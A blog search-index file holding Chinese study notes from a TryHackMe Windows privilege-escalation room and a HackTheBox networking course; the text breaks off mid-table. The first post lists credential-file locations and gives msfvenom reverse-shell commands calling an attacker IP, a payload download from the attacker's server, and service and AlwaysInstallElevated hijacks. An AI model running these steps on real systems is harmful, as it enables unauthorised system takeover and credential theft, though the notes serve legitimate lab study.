<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TryHackMe-LinuxPrivilegeEscalation</title>
      <link href="/2025/04/23/TryHackMe-WindowsPrivilegeEscalation/"/>
      <url>/2025/04/23/TryHackMe-WindowsPrivilegeEscalation/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点记录"><a href="#知识点记录" class="headerlink" title="知识点记录"></a>知识点记录</h1><p>&emsp;&emsp;此文用于记录学习 TryHackMe 网站中 Room :Windows Privilege Escalation 获得的知识点。ƪ(˘⌣˘)ʃ</p><span id="more"></span><!-- toc --><h2 id="Windows用户权限"><a href="#Windows用户权限" class="headerlink" title="Windows用户权限"></a>Windows用户权限</h2><p>&emsp;&emsp;SYSTEM &gt; Administrators &gt; Users</p><h2 id="可用信息收集"><a href="#可用信息收集" class="headerlink" title="可用信息收集"></a>可用信息收集</h2><p>&emsp;&emsp;<code>常见凭据保存地址</code>：当管理员部署 Windows 系统到大量主机时，会保存管理员账号密码，可能存储凭据的位置包括</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在这些文件中，可能含有明文字段<code>&lt;Credentials&gt;</code>，其储存管理员账号密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Credentials</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Username</span>&gt;</span>Administrator<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Domain</span>&gt;</span>thm.local<span class="tag">&lt;/<span class="name">Domain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Password</span>&gt;</span>MyPassword123<span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Credentials</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>PowerShell历史记录</code>：用户执行的 PowerShell 命令会被记录下来，如果直接在命令中使用了密码，可以通过运行指令在历史记录中被找到：<code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt（cmd.exe 使用）</code>或<code>type &quot;$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&quot;（powershell.exe 使用）</code></p><p>&emsp;&emsp;<code>已保存的Windows凭据</code>：如果用户保存了用于远程访问或共享的凭据，可以通过以下命令进行查看和尝试</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>IIS 配置文件</code>：Internet Information Services （IIS） 是 Windows 安装的默认 Web 服务器。IIS 上的网站配置存储在名为 <code>web.config</code> 的文件中，其内可包含数据库连接字符串和认证信息，常见位置如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如要查找数据库连接字符串，使用命令：<code>type &lt;filepath&gt; | findstr connectionString</code></p><p>&emsp;&emsp;<code>PuTTY会话配置</code>：PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接的参数，而是可以存储 IP、用户和其他配置，比如包含明文身份验证凭据的代理配置；检索存储的代理凭据，就要查找注册表中存储的信息，可使用如下命令：<code>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</code></p><h2 id="利用错误配置进行权限提升"><a href="#利用错误配置进行权限提升" class="headerlink" title="利用错误配置进行权限提升"></a>利用错误配置进行权限提升</h2><p>&emsp;&emsp;<code>错误的计划任务</code>：当一个计划任务使用的可执行文件丢失或者该文件可被非特权用户修改，则其可以被利用；使用命令<code>schtasks /query /tn vulntask /fo list /v</code>可以查看系统上的计划任务，以下是输出的具体解释</p><table><thead><tr><th align="center">字段名</th><th align="center">示例值</th><th align="center">解释说明</th></tr></thead><tbody><tr><td align="center">Folder</td><td align="center">\</td><td align="center">任务所在的文件夹</td></tr><tr><td align="center">HostName</td><td align="center">THM-PC1</td><td align="center">运行任务的计算机名（主机名）</td></tr><tr><td align="center">TaskName</td><td align="center">\vulntask</td><td align="center">任务的名称</td></tr><tr><td align="center">Task To Run</td><td align="center">C:\tasks\schtask.bat</td><td align="center">任务实际执行的程序或脚本</td></tr><tr><td align="center">Run As User</td><td align="center">taskusr1</td><td align="center">任务运行时使用的用户账号</td></tr></tbody></table><p>&emsp;&emsp;显然，如果可以修改 Task To Run 路径下的脚本，即可产生权限提升，查看可执行文件的文件权限可使用如下指令：<code>icacls &lt;Task To Run 脚本路径&gt;</code>，对其中输出的信息，做如下解释</p><table><thead><tr><th align="center">简写</th><th align="center">中文解释</th></tr></thead><tbody><tr><td align="center">F</td><td align="center">完全控制：可以进行所有操作，包括更改权限和所有权</td></tr><tr><td align="center">M</td><td align="center">修改：可以读取、写入、删除，但不能更改权限或所有权</td></tr><tr><td align="center">RX</td><td align="center">读取和执行：可以读取内容并执行程序，但不能修改</td></tr><tr><td align="center">R</td><td align="center">读取：只能查看内容，不能更改</td></tr><tr><td align="center">W</td><td align="center">写入：可以修改内容或新建文件，但不能删除或更改权限</td></tr><tr><td align="center">D</td><td align="center">删除：可以删除文件或文件夹</td></tr><tr><td align="center">I</td><td align="center">继承：该权限是从父对象继承而来的，不是直接分配的</td></tr></tbody></table><p>&emsp;&emsp;<code>.msi文件</code>：Windows 安装程序文件</p><p>&emsp;&emsp;<code>AlwaysInstallElevated</code>：是 Windows 的一个设置，允许所有用户以管理员权限运行 <code>.msi</code> 安装程序；如果系统启用了 AlwaysInstallElevated，攻击者可以创建一个恶意 .msi 文件，并以管理员权限执行，从而实现提权，以下是利用该方法实施提权的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 首先，检测目标系统是否启用AlwaysInstallElevated</span><br><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"># 如果两个注册表值中，AlwaysInstallElevated=1均成立，说明可以利用</span><br><span class="line"></span><br><span class="line"># 使用msfvenom生成恶意.msi文件</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP LPORT=攻击者端口 -f msi -o malicious.msi</span><br><span class="line"># 以下是各选项的解释</span><br><span class="line">-p：指定payload，比如这里用的是reverse_tcp shell，意味着生成一个Windows 64位系统用的反向TCP Shell</span><br><span class="line">-f msi：指定输出格式为 .msi</span><br><span class="line">-o malicious.msi：输出文件名</span><br><span class="line"></span><br><span class="line"># 运行生成非的.msi恶意文件</span><br><span class="line">msiexec /quiet /qn /i &lt;malicious.msi的路径&gt;</span><br><span class="line"># 以下是各选项的解释</span><br><span class="line">msiexec：Windows安装程序命令</span><br><span class="line">/quiet /qn：静默安装，无界面，不提示用户</span><br><span class="line">/i ：指定安装包</span><br></pre></td></tr></table></figure><h2 id="利用不当Windows服务配置进行权限提升"><a href="#利用不当Windows服务配置进行权限提升" class="headerlink" title="利用不当Windows服务配置进行权限提升"></a>利用不当Windows服务配置进行权限提升</h2><p>&emsp;&emsp; <code>SCM</code>：Windows 服务管理器，负责控制服务的状态、检查当前状态并提供配置服务的方式，每个服务都有一个相关的可执行文件，SCM 在服务启动时运行该文件；使用 <code>sc qc</code> 命令可以查看服务的详细配置，以下是对其关键参数的解释</p><p>&emsp;&emsp;<strong>BINARY_PATH_NAME</strong>: 指定可执行文件路径</p><p>&emsp;&emsp;<strong>SERVICE_START_NAME</strong>: 显示运行服务的账户</p><p>&emsp;&emsp;<code>DACL</code>：服务具有任意访问控制列表 （DACL），该列表指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务，以及其他权限</p><p>&emsp;&emsp;<code>服务配置</code>：所有服务配置都存储在注册表中以下位置 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code></p><p>&emsp;&emsp;<code>利用方式</code>：主要从三个方面实施权限提升：<font color="red">服务可执行文件的弱权限；无引号的服务路径；DACL 配置错误</font></p><p>&emsp;&emsp;<code>服务可执行文件的弱权限</code>：如果与服务关联的可执行文件允许攻击者修改或替换它，可利用此注入恶意脚本进行权限提升，具体做法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 1、使用sc qc查看服务的配置，找到其中的BINARY_PATH_NAME属性</span><br><span class="line">sc qc WindowsScheduler</span><br><span class="line">=&gt; BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">注：PROGRA~2是Program Files (x86)的8.3短文件名格式，SYSTEM~1是 System Scheduler的短名</span><br><span class="line"></span><br><span class="line"># 2、使用icacls查看可执行文件的权限，查看是否攻击者账号拥有修改或删除该文件的权限</span><br><span class="line">icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">=&gt; Everyone:(I)(M)</span><br><span class="line"></span><br><span class="line"># 3、使用msfvenom生成恶意可执行文件，攻击机上执行</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击机IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line"># 4、打开Python Web服务器，开放端口使目的机下载恶意.exe程序</span><br><span class="line">python3 -m http.server(攻击机执行)</span><br><span class="line">=&gt; Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">wget http://攻击者IP:8000/rev-svc.exe -O rev-svc.exe(受害机执行)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>无引号的服务路径</code>：使用 Windows 服务时，当服务配置为指向“未加引号的”可执行文件时，文件路径中的空格会被错误考虑；如果路径没有正确加引号，Windows 会尝试执行路径中的多个文件，直到找到正确的可执行文件，使用下例进行解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 比如，系统中存在一个服务路径：C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">sc qc &quot;C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe&quot;</span><br><span class="line">=&gt; 查看disksrs.exe权限</span><br><span class="line"></span><br><span class="line"># 如果不加引号</span><br><span class="line">sc qc C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">=&gt; 查找C:\MyPrograms\Disk.exe</span><br><span class="line">=&gt; 查找C:\MyPrograms\Disk Sorter.exe</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;因此，我们可以通过构造恶意的<code>C:\MyPrograms\Disk.exe</code>，实现权限提升</p><p>&emsp;&emsp;<code>DACL配置错误</code>：如果服务的 DACL 允许用户修改服务配置，我们就可以重新配置该服务，指向任何恶意可执行文件并以任何用户账户（甚至是 SYSTEM）执行它，具体做法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 1、使用Sysinternals套件中的Accesschk，检查服务的DACL配置</span><br><span class="line">accesschk64.exe -qlc &lt;指定的服务路径&gt;</span><br><span class="line">=&gt;C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line">  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_PAUSE_CONTINUE</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">        </span><br><span class="line"># 2、根据输出，发现存在漏洞可以利用，使用msfvenom生成恶意可执行文件</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击机IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line"># 3、打开Python Web服务器，开放端口使目的机下载恶意.exe程序</span><br><span class="line">python3 -m http.server(攻击机执行)</span><br><span class="line">=&gt; Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">wget http://攻击者IP:8000/rev-svc.exe -O rev-svc.exe(受害机执行)</span><br><span class="line"></span><br><span class="line"># 4、更改目标服务的配置</span><br><span class="line">sc config &lt;服务名&gt; binPath= &quot;&lt;可执行文件路径&gt;&quot; obj= LocalSystem</span><br><span class="line"></span><br><span class="line"># 5、重启服务</span><br><span class="line">C:\&gt; sc stop THMService</span><br><span class="line">C:\&gt; sc start THMService</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TryHackMe Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-JuniorCybersecurityAnalyst</title>
      <link href="/2025/04/21/HackTheBox-JuniorCybersecurityAnalyst/"/>
      <url>/2025/04/21/HackTheBox-JuniorCybersecurityAnalyst/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;此文用于记录学习 HackTheBox 网站中 Path: Junior Cyber security Analyst 获得的知识点。ƪ(˘⌣˘)ʃ</p><span id="more"></span><!-- toc --><h1 id="Path’s-Modules"><a href="#Path’s-Modules" class="headerlink" title="Path’s Modules"></a>Path’s Modules</h1><h2 id="Module-1-Introduction-to-Information-Security"><a href="#Module-1-Introduction-to-Information-Security" class="headerlink" title="Module 1: Introduction to Information Security"></a>Module 1: Introduction to Information Security</h2><h4 id="Section-1-Structure-of-InfoSec"><a href="#Section-1-Structure-of-InfoSec" class="headerlink" title="Section 1: Structure of InfoSec"></a>Section 1: Structure of InfoSec</h4><h4 id="Section-2-Principles-of-Information-Security"><a href="#Section-2-Principles-of-Information-Security" class="headerlink" title="Section 2: Principles of Information Security"></a>Section 2: Principles of Information Security</h4><h4 id="Section-3-Network-Security"><a href="#Section-3-Network-Security" class="headerlink" title="Section 3: Network Security"></a>Section 3: Network Security</h4><h4 id="Section-4-Application-Security"><a href="#Section-4-Application-Security" class="headerlink" title="Section 4: Application Security"></a>Section 4: Application Security</h4><p>&emsp;&emsp;<code>CIA</code>：confidentiality, integrity, and availability，机密性、完整性与可用性。</p><h4 id="Section-5-Operational-Security"><a href="#Section-5-Operational-Security" class="headerlink" title="Section 5: Operational Security"></a>Section 5: Operational Security</h4><h4 id="Section-6-Disaster-Recovery-and-Business-Continuity"><a href="#Section-6-Disaster-Recovery-and-Business-Continuity" class="headerlink" title="Section 6: Disaster Recovery and Business Continuity"></a>Section 6: Disaster Recovery and Business Continuity</h4><p>&emsp;&emsp;<code>DR\BR</code>：Disaster Recovery&#x2F;Business Continuity，灾难恢复&#x2F;业务连续性。</p><h4 id="Section-7-Cloud-Security"><a href="#Section-7-Cloud-Security" class="headerlink" title="Section 7: Cloud Security"></a>Section 7: Cloud Security</h4><h4 id="Section-8-Physical-Security"><a href="#Section-8-Physical-Security" class="headerlink" title="Section 8: Physical Security"></a>Section 8: Physical Security</h4><h4 id="Section-9-Mobile-Security"><a href="#Section-9-Mobile-Security" class="headerlink" title="Section 9: Mobile Security"></a>Section 9: Mobile Security</h4><h4 id="Section-10-Internet-of-Things-Security"><a href="#Section-10-Internet-of-Things-Security" class="headerlink" title="Section 10: Internet of Things Security"></a>Section 10: Internet of Things Security</h4><h4 id="Section-11-Distributed-Denial-of-Service"><a href="#Section-11-Distributed-Denial-of-Service" class="headerlink" title="Section 11: Distributed Denial of Service"></a>Section 11: Distributed Denial of Service</h4><p>&emsp;&emsp;<code>DDoS</code>：Distributed Denial of Service，分布式拒绝服务。</p><h4 id="Section-12-Ransomware"><a href="#Section-12-Ransomware" class="headerlink" title="Section 12: Ransomware"></a>Section 12: Ransomware</h4><h4 id="Section-13-Social-Engineering"><a href="#Section-13-Social-Engineering" class="headerlink" title="Section 13: Social Engineering"></a>Section 13: Social Engineering</h4><h4 id="Section-14-Insider-Threat"><a href="#Section-14-Insider-Threat" class="headerlink" title="Section 14: Insider Threat"></a>Section 14: Insider Threat</h4><h4 id="Section-15-Advanced-Persistent-Threats"><a href="#Section-15-Advanced-Persistent-Threats" class="headerlink" title="Section 15: Advanced Persistent Threats"></a>Section 15: Advanced Persistent Threats</h4><p>&emsp;&emsp;<code>APT</code>：Advanced Persistent Threats，高级持续性威胁。</p><h4 id="Section-16-Threat-Actors"><a href="#Section-16-Threat-Actors" class="headerlink" title="Section 16: Threat Actors"></a>Section 16: Threat Actors</h4><h4 id="Section-17-Red-Team"><a href="#Section-17-Red-Team" class="headerlink" title="Section 17: Red Team"></a>Section 17: Red Team</h4><h4 id="Section-18-Blue-Team"><a href="#Section-18-Blue-Team" class="headerlink" title="Section 18: Blue Team"></a>Section 18: Blue Team</h4><h4 id="Section-19-Purple-Team"><a href="#Section-19-Purple-Team" class="headerlink" title="Section 19: Purple Team"></a>Section 19: Purple Team</h4><h4 id="Section-20-Chief-Information-Security-Officer"><a href="#Section-20-Chief-Information-Security-Officer" class="headerlink" title="Section 20: Chief Information Security Officer"></a>Section 20: Chief Information Security Officer</h4><p>&emsp;&emsp;<code>CISO</code>：Chief Information Security Officer，首席信息安全官。</p><h4 id="Section-21-Penetration-Testers"><a href="#Section-21-Penetration-Testers" class="headerlink" title="Section 21: Penetration Testers"></a>Section 21: Penetration Testers</h4><h4 id="Section-22-Security-Operations-Center"><a href="#Section-22-Security-Operations-Center" class="headerlink" title="Section 22: Security Operations Center"></a>Section 22: Security Operations Center</h4><p>&emsp;&emsp;<code>SOC</code>：Security Operations Center，安全运营中心。</p><h4 id="Section-23-Bug-Bounty-Hunter"><a href="#Section-23-Bug-Bounty-Hunter" class="headerlink" title="Section 23: Bug Bounty Hunter"></a>Section 23: Bug Bounty Hunter</h4><h4 id="Section-24-Recommendations"><a href="#Section-24-Recommendations" class="headerlink" title="Section 24: Recommendations"></a>Section 24: Recommendations</h4><h2 id="Module-2-Network-Foundations"><a href="#Module-2-Network-Foundations" class="headerlink" title="Module 2: Network Foundations"></a>Module 2: Network Foundations</h2><h4 id="Section-1"><a href="#Section-1" class="headerlink" title="Section 1:"></a>Section 1:</h4><p>&emsp;&emsp;<code>LAN/WAN</code>：局域网&#x2F;广域网。</p><p>&emsp;&emsp;<code>什么是网络？</code>：网络是可以互相通信、接发数据的设备的集合，其主要有以下部分构成：</p><table><thead><tr><th align="center">概念</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Nodes</td><td align="center">连接到网络的单个设备</td></tr><tr><td align="center">Links</td><td align="center">连接两个 Node 的通信路径</td></tr><tr><td align="center">Data Sharing</td><td align="center">网络的目的是实现设备间的数据交换</td></tr></tbody></table><p>&emsp;&emsp;<code>局域网</code>：小范围的网络，连接短距离内的设备，其具有以下特点：</p><table><thead><tr><th align="center">特点</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Resource Sharing</td><td align="center">占地面积小</td></tr><tr><td align="center">Ownership</td><td align="center">通常属于个人或单个组织</td></tr><tr><td align="center">Speed</td><td align="center">数据的传输速率高</td></tr><tr><td align="center">Media</td><td align="center">通信路径连接的媒体，通常是以太网电缆或 Wi-Fi</td></tr></tbody></table><p>&emsp;&emsp;<code>广域网</code>：连接多个局域网的网络，最大的即是互联网，较局域网而言，数据传输较慢、通信路径载体多为光纤、卫星等。</p><p>&emsp;&emsp;以如下图展示局域网及广域网的基本结构：</p><p><img src="/2025/04/21/HackTheBox-JuniorCybersecurityAnalyst/Network.png" title="Network"></p><h4 id="Section-2-Network-Concepts"><a href="#Section-2-Network-Concepts" class="headerlink" title="Section 2: Network Concepts"></a>Section 2: Network Concepts</h4><p>&emsp;&emsp;<code>OSI Model</code>：Open Systems Interconnection Model，将电信或计算系统的功能标准化为七个抽象层。</p><p>![](OSI Model.png “OSI Model”)</p><table><thead><tr><th align="center">抽象层</th><th>描述</th></tr></thead><tbody><tr><td align="center">物理层</td><td>&emsp;&emsp;负责在物理介质上传输原始比特流，处理设备之间的物理连接，包括以太网电缆、集线器、中继器等硬件组件。</td></tr><tr><td align="center">数据链路层</td><td>&emsp;&emsp;提供节点到节点的数据传输，确保数据帧的同步、错误检测与纠正。交换机和网桥工作在该层，使用 MAC 地址识别网络设备。</td></tr><tr><td align="center">网络层</td><td>&emsp;&emsp;负责分组转发和路由选择，使用 IP 地址进行逻辑寻址，确保数据能跨越多个网络到达正确的目的地。路由器在该层工作。</td></tr><tr><td align="center">传输层</td><td>&emsp;&emsp;提供端到端通信服务，负责数据的可靠或不可靠传输、分段、重组、流量控制和错误校验。常用协议有 TCP（可靠、面向连接）和 UDP（快速、无连接）。</td></tr><tr><td align="center">会话层</td><td>&emsp;&emsp;管理应用之间的会话，负责建立、维护和终止连接，并支持会话检查点与恢复，保证中断后通信可恢复。</td></tr><tr><td align="center">表示层</td><td>&emsp;&emsp;作为应用层与网络格式之间的翻译者，处理数据表示、加密解密、压缩和格式转换，保证跨系统数据可读。</td></tr><tr><td align="center">应用层</td><td>&emsp;&emsp;直接为终端用户应用提供网络服务，如资源共享、远程文件访问。常见协议包括 HTTP、FTP、SMTP、DNS 等。</td></tr></tbody></table><p>&emsp;&emsp;<code>TCP/IP Model</code>：Transmission Control Protocol&#x2F;Internet Protocol Model，简化 OSI Model 为四层。</p><p>![](TCP-IP Model.png “TCP-IP Model”)</p><table><thead><tr><th align="center">抽象层</th><th>描述</th></tr></thead><tbody><tr><td align="center">链路层</td><td>负责处理网络硬件和介质的物理方面，包括以太网（有线）和 Wi-Fi（无线）等技术。对应 OSI 模型的物理层和数据链路层，涵盖从物理连接到数据帧的处理。</td></tr><tr><td align="center">网际层</td><td>负责设备的逻辑寻址和跨网络的数据包路由，常用协议有 IP（互联网协议）、ICMP（互联网控制报文协议）。确保数据包通过逻辑路径到达正确目的地，对应 OSI 网络层。</td></tr><tr><td align="center">传输层</td><td>提供端到端通信服务，确保数据包按序且无误传递。TCP 提供可靠、面向连接的通信，UDP 提供快速、无连接的服务。对应 OSI 传输层。</td></tr><tr><td align="center">应用层</td><td>包含直接为应用提供服务的协议，如 HTTP（网页浏览）、FTP（文件传输）、SMTP（电子邮件）。对应 OSI 的会话层、表示层和应用层，提供数据交换的接口与协议。</td></tr></tbody></table><p>&emsp;&emsp;<code>网络传输</code>：即指通过介质将数据信从一台设备发送到另一台设备的过程。</p><p>&emsp;&emsp;<code>传输类型</code>：分为模拟和数字两种，模拟传输使用连续变化的波形传输信息，多用于无线电广播；数字传输使用 0&#x2F;1 比特位传输信息，多用于计算机网络中。</p><p>&emsp;&emsp;<code>传输模式</code>：分为 Simplex、Half-duplex 和 Full-duplex三种模式。</p><table><thead><tr><th align="center">模式</th><th align="center">描述</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">Simplex，单工</td><td align="center">仅允许单向通信</td><td align="center">键盘到计算机</td></tr><tr><td align="center">Half-duplex，半双工</td><td align="center">允许双向通信，但不能同时进行</td><td align="center">对讲机通话</td></tr><tr><td align="center">Full-duplex，全双工</td><td align="center">支持双向同时通信</td><td align="center">电话通话</td></tr></tbody></table><p>&emsp;&emsp;<code>传输介质</code>：在网络中传输数据的物理方式，有线（光纤等）或无线（Wi-Fi、红外遥控器等）。</p><h4 id="Section-3-Components-of-a-Network"><a href="#Section-3-Components-of-a-Network" class="headerlink" title="Section 3: Components of a Network"></a>Section 3: Components of a Network</h4><p>&emsp;&emsp;<code>网络组件</code>：分为以下四部分：End Devices，终端设备；Intermediary Devices，中间设备；Network Media and Software Components，网络媒体和软件组件；Servers，服务器。</p><p>&emsp;&emsp;<code>End Devices</code>：接发数据的设备，电脑、手机、平板均是。</p><p>&emsp;&emsp;<code>Intermediary Devices</code>：主要介绍三种，网卡、路由器和交换机：</p><table><thead><tr><th align="center">中间设备</th><th>描述</th></tr></thead><tbody><tr><td align="center">Network Interface Cards（NICs），网络接口卡</td><td>用于连接到网络，如通过电缆连接的以太网卡，或者是利用无线电波的 Wi-Fi 适配器。每个网卡拥有一个 MAC地址。</td></tr><tr><td align="center">Routers，路由器</td><td>读取数据包中的网络地址信息以确定其目的地，使用路由表和路由协议 <code>Open Shortest Path First (OSPF)</code>来查找数据间传递的最有效路径。</td></tr><tr><td align="center">Switches，交换机</td><td>连接同一网络内的多个设备，使用 MAC 地址仅将数据转发给预期的接收者，比如员工发送资料至打印机。</td></tr></tbody></table><p>&emsp;&emsp;<code>Network Media and Software Components</code>：网络媒体（电缆和连接线）和网络协议（如 TCP&#x2F;IP 等）不再说明，主要说明软件防火墙：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Software Firewalls</span><br><span class="line">- 特点</span><br><span class="line">  1、安装在单个计算机或设备上的安全应用程序</span><br><span class="line">  2、对单个设备起作用</span><br><span class="line">- 作用</span><br><span class="line">  1、防止未经授权的访问</span><br><span class="line">  2、拒绝包含可疑或恶意数据的传入数据包</span><br><span class="line">  3、限制某些应用程序或服务的访问</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>Servers</code>：服务器通常运行专门的操作系统，这些操作系统经过优化，以处理多个同时请求。</p><h4 id="Section-4-Network-Communication"><a href="#Section-4-Network-Communication" class="headerlink" title="Section 4: Network Communication"></a>Section 4: Network Communication</h4><p>&emsp;&emsp;<code>MAC Address</code>：每个 MAC 地址长 48 位，通常以十六进制格式表示，显示为六对十六进制数字，用冒号或连字符分隔，例如 00：1A：2B：3C：4D：5E。其前 24 位代表分配给制造商的地址 <code>Organizationally Unique Identifier (OUI)</code> ，而其余 24 位则特定于单个设备。</p><p>&emsp;&emsp;<code>MAC 地址的使用</code>：MAC 地址是局域网内本地通信的基础，用于将数据帧传送到正确的物理设备，其具体通信过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data + destination MAC -&gt; a data frame</span><br><span class="line">a data frame -&gt; switches =&gt; get destination MAC</span><br><span class="line">switch send the frame -&gt; right port</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;此外，还可以通过 Address Resolution Protocol（ARP）协议将 IP 地址映射到 MAC 地址，允许设备找到与同一网络内已知 IP 地址关联的 MAC 地址，如下图所示：</p><p><img src="/2025/04/21/HackTheBox-JuniorCybersecurityAnalyst/IP-MAC.png" title="IP-MAC"></p><p>&emsp;&emsp;<code>IP/Port</code>：具体格式不再解释，这里记录一个检测、侦听端口的指令：<strong>netstat</strong>。</p><p>&emsp;&emsp;<code>访问网站的具体步骤</code>：如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 